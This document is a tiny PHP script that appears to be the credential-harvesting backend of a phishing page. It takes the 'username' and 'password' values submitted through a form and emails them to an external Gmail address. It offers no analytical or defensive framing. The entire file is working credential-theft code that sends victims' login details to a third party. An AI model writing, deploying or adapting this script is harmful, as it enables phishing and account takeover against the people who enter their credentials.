<?php
$message .= "Mail                            : ".$_POST['username']."\n";
$message .= "Pass                    : ".$_POST['password']."\n";
mail('lolprodajaacc@gmail.com', 'My Subject', $message);
?>